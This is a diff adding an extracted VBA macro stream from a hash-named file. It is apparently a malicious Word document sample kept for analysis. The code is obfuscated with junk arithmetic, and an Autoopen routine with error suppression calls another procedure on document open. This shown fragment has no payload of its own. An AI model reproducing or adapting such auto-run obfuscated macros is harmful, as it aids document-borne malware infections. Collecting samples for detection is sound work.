@@ -1,0 +1,74 @@
+Filename     : ./macros/4eea71c49b8b8b86708e58cc46e2c7b17fc213af0100f8b01caf13742e0e27a6
+OLE stream   : Macros/VBA/qIsjsUf
+VBA filename : qIsjsUf.cls
+----------------------------------------
+Attribute VB_Name = "qIsjsUf"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+Sub GzZBl(wLBst)
+GormpC = RPAUdW
+tHWHqD = dKppzT
+URRSod = KzTNwS + Sgn(77525 - FdviK - ppuCp + Fix(87227)) - 55766 - CDbl(58107)
+wpiMw = 95569
+End Sub
+Sub BpsfjJ(urlzV)
+MuVJL = cXQzkT
+vWYPFr = WbGli
+jnzKDt = ZpCTY + Sgn(476 - VLlpI - CNfWb + Fix(61625)) - 15119 - CDbl(21753)
+knjiYz = 78759
+FwqLG = UEqFa
+LqQdTk = HdjXm
+rFOjtb = jnjtR + Sgn(237 - HLRlah - WuXGL + Fix(78413)) - 62716 - CDbl(64386)
+WYEPPA = 10698
+wiIIY = WLSoL
+MwwEZV = qdiml
+tKUNkh = FwowZ + Sgn(28090 - jBvsAV - hYcAqt + Fix(80045)) - 28236 - CDbl(83708)
+rXIfA = 2860
+End Sub
+Sub iHEqPJ(fKXbp)
+plQNLl = NunQrF
+EBFSj = zKtQvS
+bUfWO = JZFGu + Sgn(38943 - IkoTo - KkwdEF + Fix(84367)) - 79666 - CDbl(70500)
+szSsXR = 85701
+RCRvA = uKwVrM
+ZcwIi = raRWjZ
+NHcbqr = aClhOk + Sgn(96320 - uGWwYJ - XWktl + Fix(2659)) - 76846 - CDbl(487)
+iWFkni = 43703
+End Sub
+Sub Autoopen()
+On Error Resume Next
+zTvXqO = thIjKz
+AlvjFr = FqmCFz
+iNuLks = ENuhHq + Sgn(99597 - sHqjw - UpEdf + Fix(64052)) - 87055 - CDbl(55549)
+VlPCP = 37777
+sOBlwwww (UaHmw + AHmRQqZDIRTn + ACzAz)
+wiMYC = KYpiE
+FbEZv = nklimP
+KZwoC = ijsiiJ + Sgn(24836 - jEvYm - wjUTb + Fix(12275)) - 10129 - CDbl(24892)
+PTrwz = 85758
+End Sub
+Sub OjnDZa(zZPif)
+jpGAu = dFcMwa
+XcKnN = UlqMk
+vVSXuM = ZFjaN + Sgn(83450 - WPqlW - dHDlmm + Fix(3798)) - 40930 - CDbl(21650)
+qdVRw = 13411
+iiAYA = rBzvL
+FuEptG = RhkIKC
+jqwsa = PEHDW + Sgn(36029 - vMjpqq - GblobL + Fix(20222)) - 78838 - CDbl(56170)
+aqWlcA = 10088
+VIaAm = TadsF
+vRTXII = IQOsa
+KdfwqT = ikUiD + Sgn(10376 - kVBhSj - BIWwdT + Fix(93339)) - 94033 - CDbl(77919)
+PAZcY = 75676
+End Sub
+Sub mYtTKw(UDUUnP)
+arvIUJ = NzPhwO
+DfLLh = vtpMr
+kiazc = ZZpId + Sgn(37975 - djZYi - OiTQXI + Fix(15901)) - 10655 - CDbl(85306)
+jBjRIZ = 37486
+End Sub
